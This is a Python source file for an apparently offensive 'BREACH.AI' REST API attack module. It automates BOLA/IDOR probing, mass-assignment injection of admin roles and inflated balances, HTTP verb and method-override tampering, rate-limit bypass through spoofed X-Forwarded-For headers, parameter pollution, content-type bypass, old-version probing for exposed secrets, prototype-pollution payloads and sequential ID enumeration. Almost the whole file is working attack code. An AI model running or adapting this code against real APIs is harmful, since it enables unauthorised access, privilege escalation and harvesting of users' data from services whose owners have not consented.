"""
BREACH.AI - REST API Attacker

Comprehensive REST API attack module.
RESTful APIs are everywhere - and they're full of vulnerabilities.

Attack Categories:
1. BOLA/IDOR - Broken Object Level Authorization
2. Mass Assignment - Modify protected fields
3. Rate Limit Bypass - Abuse APIs without limits
4. HTTP Verb Tampering - Bypass restrictions via methods
5. Parameter Pollution - Confuse parsers with duplicates
6. JSON Injection - Inject via JSON structures
7. API Versioning Abuse - Access deprecated features
8. Content-Type Manipulation - Bypass validation
"""

import asyncio
import json
import re
from dataclasses import dataclass, field
from typing import Optional
from urllib.parse import urljoin, urlparse, parse_qs, urlencode

from backend.breach.attacks.base import AttackResult, BaseAttack
from backend.breach.core.memory import AccessLevel, Severity
from backend.breach.utils.logger import logger


@dataclass
class APIEndpoint:
    """REST API endpoint."""
    path: str
    method: str = "GET"
    params: list[str] = field(default_factory=list)
    requires_auth: bool = False


class RESTAPIAttacker(BaseAttack):
    """
    REST API ATTACKER - Comprehensive REST API exploitation.

    REST APIs have unique vulnerability patterns.
    We exploit every one: BOLA, mass assignment, rate limits, and more.
    """

    name = "REST API Attacker"
    attack_type = "rest_api_attack"
    description = "Comprehensive REST API vulnerability exploitation"
    severity = Severity.HIGH
    owasp_category = "API Security"
    cwe_id = 284

    # Common REST endpoints with ID parameters
    BOLA_ENDPOINTS = [
        "/api/users/{id}",
        "/api/user/{id}",
        "/api/accounts/{id}",
        "/api/account/{id}",
        "/api/orders/{id}",
        "/api/order/{id}",
        "/api/documents/{id}",
        "/api/files/{id}",
        "/api/messages/{id}",
        "/api/posts/{id}",
        "/api/comments/{id}",
        "/api/profiles/{id}",
        "/api/settings/{id}",
        "/users/{id}",
        "/v1/users/{id}",
        "/v2/users/{id}",
    ]

    # IDs to test for BOLA
    TEST_IDS = [
        "1", "2", "100", "1000",
        "0", "-1",
        "admin", "root", "system",
        "00000000-0000-0000-0000-000000000001",
        "00000000-0000-0000-0000-000000000000",
    ]

    # Mass assignment fields to inject
    MASS_ASSIGNMENT_FIELDS = {
        "role": ["admin", "administrator", "superuser"],
        "is_admin": [True, "true", "1"],
        "isAdmin": [True, "true", "1"],
        "admin": [True, "true", "1"],
        "permissions": [["*"], ["admin"], "all"],
        "user_type": ["admin", "staff", "internal"],
        "verified": [True, "true", "1"],
        "email_verified": [True],
        "active": [True],
        "balance": [999999],
        "credits": [999999],
        "subscription": ["premium", "enterprise"],
        "plan": ["enterprise"],
    }

    # HTTP methods to test
    HTTP_METHODS = ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD", "TRACE"]

    # Content types to test
    CONTENT_TYPES = [
        "application/json",
        "application/xml",
        "application/x-www-form-urlencoded",
        "text/plain",
        "text/xml",
        "multipart/form-data",
    ]

    def get_payloads(self) -> list[str]:
        return self.BOLA_ENDPOINTS

    async def check(
        self,
        url: str,
        parameter: Optional[str] = None,
        method: str = "GET",
        **kwargs
    ) -> bool:
        """Check if REST API exists."""
        # Check common API indicators
        api_paths = ["/api", "/v1", "/v2", "/rest"]

        for path in api_paths:
            response = await self.http_client.get(urljoin(url, path))
            if response.status_code in [200, 401, 403]:
                return True

        return False

    async def exploit(
        self,
        url: str,
        parameter: Optional[str] = None,
        method: str = "GET",
        **kwargs
    ) -> AttackResult:
        """Execute comprehensive REST API attacks."""
        result = self._create_result(False, url, parameter)

        logger.info("[REST] Starting REST API attack campaign...")

        # Attack 1: BOLA/IDOR Testing
        bola_result = await self._attack_bola(url)
        if bola_result:
            result.success = True
            result.severity = Severity.CRITICAL
            result.details = f"BOLA vulnerability: {bola_result['endpoint']}"
            result.access_gained = AccessLevel.USER
            result.add_evidence(
                "api_bola",
                "Broken Object Level Authorization",
                bola_result["details"]
            )
            return result

        # Attack 2: Mass Assignment
        mass_result = await self._attack_mass_assignment(url)
        if mass_result:
            result.success = True
            result.severity = Severity.CRITICAL
            result.payload = mass_result["field"]
            result.details = f"Mass assignment: {mass_result['field']}"
            result.access_gained = AccessLevel.ADMIN
            result.add_evidence(
                "api_mass_assignment",
                "Protected field can be modified",
                mass_result["details"]
            )
            return result

        # Attack 3: HTTP Verb Tampering
        verb_result = await self._attack_verb_tampering(url)
        if verb_result:
            result.success = True
            result.details = f"Verb tampering: {verb_result['method']}"
            result.add_evidence(
                "api_verb_tampering",
                f"Bypassed restriction via {verb_result['method']}",
                verb_result["details"]
            )

        # Attack 4: Rate Limit Bypass
        rate_result = await self._attack_rate_limit(url)
        if rate_result:
            result.success = True
            result.details = f"Rate limit bypass: {rate_result['method']}"
            result.add_evidence(
                "api_rate_limit_bypass",
                "API rate limiting can be bypassed",
                rate_result["details"]
            )

        # Attack 5: Parameter Pollution
        pollution_result = await self._attack_parameter_pollution(url)
        if pollution_result:
            result.success = True
            result.details = "Parameter pollution vulnerability"
            result.add_evidence(
                "api_param_pollution",
                "API vulnerable to parameter pollution",
                pollution_result["details"]
            )

        # Attack 6: Content-Type Bypass
        content_result = await self._attack_content_type(url)
        if content_result:
            result.success = True
            result.details = f"Content-Type bypass: {content_result['type']}"
            result.add_evidence(
                "api_content_type_bypass",
                "Validation bypassed via Content-Type",
                content_result["details"]
            )

        # Attack 7: Version Downgrade
        version_result = await self._attack_version_downgrade(url)
        if version_result:
            result.success = True
            result.details = f"API version vulnerability: {version_result['version']}"
            result.add_evidence(
                "api_version_downgrade",
                "Old API version accessible",
                version_result["details"]
            )

        # Attack 8: JSON Injection
        json_result = await self._attack_json_injection(url)
        if json_result:
            result.success = True
            result.severity = Severity.HIGH
            result.details = f"JSON injection: {json_result['type']}"
            result.add_evidence(
                "api_json_injection",
                "JSON structure injection possible",
                json_result["details"]
            )

        # Attack 9: ID Enumeration
        enum_result = await self._attack_id_enumeration(url)
        if enum_result:
            result.success = True
            result.details = "Resource ID enumeration possible"
            result.add_evidence(
                "api_id_enumeration",
                "API allows ID enumeration",
                enum_result["details"]
            )

        return result

    async def _attack_bola(self, url: str) -> Optional[dict]:
        """Test for Broken Object Level Authorization."""
        logger.debug("[REST] Testing BOLA/IDOR...")

        for endpoint_template in self.BOLA_ENDPOINTS:
            for test_id in self.TEST_IDS:
                endpoint = endpoint_template.replace("{id}", test_id)
                full_url = urljoin(url, endpoint)

                try:
                    response = await self.http_client.get(full_url)

                    if response.status_code == 200:
                        try:
                            data = json.loads(response.body)
                            # Check if we got user/object data
                            if isinstance(data, dict) and any(
                                k in data for k in ["id", "email", "user", "name", "data"]
                            ):
                                logger.info(f"[REST] BOLA found at {endpoint}")
                                return {
                                    "endpoint": endpoint,
                                    "id": test_id,
                                    "details": f"Accessed object {test_id} at {endpoint}"
                                }
                        except json.JSONDecodeError:
                            pass

                except Exception:
                    continue

        return None

    async def _attack_mass_assignment(self, url: str) -> Optional[dict]:
        """Test for mass assignment vulnerabilities."""
        logger.debug("[REST] Testing mass assignment...")

        # Find endpoints that accept POST/PUT/PATCH
        test_endpoints = [
            "/api/users", "/api/user", "/api/profile",
            "/api/account", "/api/settings", "/api/me",
            "/v1/users", "/v1/user", "/v1/profile",
        ]

        for endpoint in test_endpoints:
            full_url = urljoin(url, endpoint)

            for field_name, values in self.MASS_ASSIGNMENT_FIELDS.items():
                for value in values:
                    payload = {
                        "name": "Test User",
                        "email": "test@example.com",
                        field_name: value,
                    }

                    for method in ["POST", "PUT", "PATCH"]:
                        try:
                            if method == "POST":
                                response = await self.http_client.post(
                                    full_url,
                                    json=payload,
                                    headers={"Content-Type": "application/json"}
                                )
                            elif method == "PUT":
                                response = await self.http_client.request(
                                    "PUT",
                                    full_url,
                                    json=payload,
                                    headers={"Content-Type": "application/json"}
                                )
                            else:
                                response = await self.http_client.request(
                                    "PATCH",
                                    full_url,
                                    json=payload,
                                    headers={"Content-Type": "application/json"}
                                )

                            if response.status_code in [200, 201]:
                                try:
                                    data = json.loads(response.body)
                                    # Check if our field was accepted
                                    if field_name in str(data):
                                        return {
                                            "field": field_name,
                                            "value": value,
                                            "endpoint": endpoint,
                                            "details": f"Field '{field_name}' accepted via {method}"
                                        }
                                except json.JSONDecodeError:
                                    pass

                        except Exception:
                            continue

        return None

    async def _attack_verb_tampering(self, url: str) -> Optional[dict]:
        """Test for HTTP verb tampering vulnerabilities."""
        logger.debug("[REST] Testing HTTP verb tampering...")

        # Find endpoints that return 403/405
        test_endpoints = [
            "/api/admin", "/admin", "/api/internal",
            "/api/users", "/api/config", "/api/settings",
        ]

        for endpoint in test_endpoints:
            full_url = urljoin(url, endpoint)

            # Get baseline with GET
            try:
                baseline = await self.http_client.get(full_url)

                if baseline.status_code in [401, 403, 405]:
                    # Try other methods
                    for method in ["POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD"]:
                        try:
                            response = await self.http_client.request(method, full_url)

                            if response.status_code == 200:
                                return {
                                    "method": method,
                                    "endpoint": endpoint,
                                    "details": f"{method} returned 200 while GET returned {baseline.status_code}"
                                }

                        except Exception:
                            continue

                    # Try method override headers
                    override_headers = [
                        {"X-HTTP-Method-Override": "DELETE"},
                        {"X-HTTP-Method": "DELETE"},
                        {"X-Method-Override": "DELETE"},
                    ]

                    for headers in override_headers:
                        response = await self.http_client.get(full_url, headers=headers)
                        if response.status_code == 200:
                            return {
                                "method": f"GET with {list(headers.keys())[0]}",
                                "endpoint": endpoint,
                                "details": "Method override header accepted"
                            }

            except Exception:
                continue

        return None

    async def _attack_rate_limit(self, url: str) -> Optional[dict]:
        """Test for rate limit bypass."""
        logger.debug("[REST] Testing rate limit bypass...")

        test_endpoint = urljoin(url, "/api/users")
        bypass_methods = []

        # Method 1: Rapid requests
        rate_limited = False
        for _ in range(50):
            response = await self.http_client.get(test_endpoint)
            if response.status_code == 429:
                rate_limited = True
                break

        if not rate_limited:
            bypass_methods.append("No rate limiting")

        # Method 2: X-Forwarded-For bypass
        if rate_limited:
            for i in range(10):
                response = await self.http_client.get(
                    test_endpoint,
                    headers={"X-Forwarded-For": f"192.168.1.{i}"}
                )
                if response.status_code != 429:
                    bypass_methods.append("X-Forwarded-For bypass")
                    break

        # Method 3: Different Accept headers
        if rate_limited:
            accept_headers = [
                "application/json",
                "application/xml",
                "text/html",
            ]
            for accept in accept_headers:
                response = await self.http_client.get(
                    test_endpoint,
                    headers={"Accept": accept}
                )
                if response.status_code != 429:
                    bypass_methods.append(f"Accept header bypass: {accept}")
                    break

        if bypass_methods:
            return {
                "method": bypass_methods[0],
                "details": f"Bypass methods: {', '.join(bypass_methods)}"
            }

        return None

    async def _attack_parameter_pollution(self, url: str) -> Optional[dict]:
        """Test for HTTP parameter pollution."""
        logger.debug("[REST] Testing parameter pollution...")

        test_endpoints = [
            "/api/search?q=test",
            "/api/users?id=1",
            "/api/items?filter=active",
        ]

        for endpoint in test_endpoints:
            full_url = urljoin(url, endpoint)

            # Get baseline
            try:
                baseline = await self.http_client.get(full_url)

                # Add duplicate parameter
                if "?" in full_url:
                    polluted_url = full_url + "&" + full_url.split("?")[1]
                else:
                    continue

                response = await self.http_client.get(polluted_url)

                # Check for different behavior
                if (
                    response.status_code != baseline.status_code or
                    len(response.body) != len(baseline.body)
                ):
                    return {
                        "endpoint": endpoint,
                        "details": f"Different response with duplicate params"
                    }

                # Also test array notation
                param = endpoint.split("?")[1].split("=")[0]
                array_url = full_url + f"&{param}[]=injected"
                response = await self.http_client.get(array_url)

                if "injected" in response.body:
                    return {
                        "endpoint": endpoint,
                        "details": "Array parameter injection possible"
                    }

            except Exception:
                continue

        return None

    async def _attack_content_type(self, url: str) -> Optional[dict]:
        """Test for Content-Type based bypass."""
        logger.debug("[REST] Testing Content-Type bypass...")

        test_endpoints = [
            "/api/users",
            "/api/login",
            "/api/data",
        ]

        payload = {"test": "value", "admin": True}

        for endpoint in test_endpoints:
            full_url = urljoin(url, endpoint)

            for content_type in self.CONTENT_TYPES:
                try:
                    # Convert payload based on content type
                    if "json" in content_type:
                        body = json.dumps(payload)
                    elif "xml" in content_type:
                        body = "<root><test>value</test><admin>true</admin></root>"
                    elif "form" in content_type:
                        body = urlencode(payload)
                    else:
                        body = str(payload)

                    response = await self.http_client.post(
                        full_url,
                        data=body,
                        headers={"Content-Type": content_type}
                    )

                    if response.status_code in [200, 201]:
                        return {
                            "type": content_type,
                            "endpoint": endpoint,
                            "details": f"Request accepted with {content_type}"
                        }

                except Exception:
                    continue

        return None

    async def _attack_version_downgrade(self, url: str) -> Optional[dict]:
        """Test for API version downgrade vulnerabilities."""
        logger.debug("[REST] Testing API version downgrade...")

        versions = ["v1", "v2", "v3", "v0", "beta", "alpha", "internal"]

        # Find a working endpoint
        test_paths = ["/users", "/user", "/me", "/profile"]

        for version in versions:
            for path in test_paths:
                endpoint = f"/{version}{path}"
                full_url = urljoin(url, endpoint)

                try:
                    response = await self.http_client.get(full_url)

                    if response.status_code == 200:
                        # Check for deprecated/dangerous features
                        if "password" in response.body.lower() or "secret" in response.body.lower():
                            return {
                                "version": version,
                                "endpoint": endpoint,
                                "details": f"Old version {version} exposes sensitive data"
                            }

                except Exception:
                    continue

        return None

    async def _attack_json_injection(self, url: str) -> Optional[dict]:
        """Test for JSON injection vulnerabilities."""
        logger.debug("[REST] Testing JSON injection...")

        test_endpoints = ["/api/users", "/api/search", "/api/query"]

        injection_payloads = [
            # JSON key injection
            {"name": "test\",\"admin\":true,\"x\":\""},
            # Prototype pollution
            {"__proto__": {"admin": True}},
            {"constructor": {"prototype": {"admin": True}}},
            # Nested injection
            {"user": {"name": "test", "role": "admin"}},
        ]

        for endpoint in test_endpoints:
            full_url = urljoin(url, endpoint)

            for payload in injection_payloads:
                try:
                    response = await self.http_client.post(
                        full_url,
                        json=payload,
                        headers={"Content-Type": "application/json"}
                    )

                    if response.status_code in [200, 201]:
                        try:
                            data = json.loads(response.body)
                            # Check if injection worked
                            if "admin" in str(data) and "true" in str(data).lower():
                                return {
                                    "type": "JSON injection",
                                    "payload": str(payload),
                                    "details": "JSON structure was modified"
                                }
                        except json.JSONDecodeError:
                            pass

                except Exception:
                    continue

        return None

    async def _attack_id_enumeration(self, url: str) -> Optional[dict]:
        """Test for ID enumeration vulnerability."""
        logger.debug("[REST] Testing ID enumeration...")

        # Test sequential IDs
        test_endpoints = ["/api/users/", "/api/items/", "/api/orders/"]

        for endpoint in test_endpoints:
            valid_responses = 0

            for i in range(1, 20):
                full_url = urljoin(url, f"{endpoint}{i}")

                try:
                    response = await self.http_client.get(full_url)

                    if response.status_code == 200:
                        valid_responses += 1

                except Exception:
                    continue

            if valid_responses >= 5:
                return {
                    "endpoint": endpoint,
                    "details": f"Found {valid_responses} valid sequential IDs"
                }

        return None
